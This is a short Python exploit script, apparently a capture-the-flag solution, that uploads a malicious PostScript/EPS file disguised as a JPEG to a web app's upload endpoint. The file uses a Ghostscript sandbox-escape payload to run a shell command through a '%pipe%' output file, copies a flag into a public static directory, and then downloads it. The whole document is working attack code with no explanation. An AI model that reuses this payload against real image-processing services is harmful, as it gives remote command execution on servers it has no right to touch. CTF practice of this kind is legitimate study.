import requests
import re

host, port = "94.237.122.235", 59653
url = f"http://{host}:{port}"
url_upload = f"http://{host}:{port}/api/upload"
url_flag = f"http://{host}:{port}/static/petpets/flag.txt"

def create_payload():
    content = """%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{  null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag >> /app/application/static/petpets/flag.txt) 
currentdevice putdeviceprops"""
    with open("remote.jpg", "w") as f:
        f.write(content)

def send_payload(url_upload):
    create_payload()
    with open("remote.jpg", "rb") as f:
        files = {
            #<filename> <file> <MIME type>
            "file": ("remote.jpg", f, "image/jpeg")
        }
        response = requests.post(url_upload, files=files)

def read_flag(url_flag):
    send_payload(url_upload)
    response = requests.get(url_flag)
    print(response.text)

read_flag(url_flag)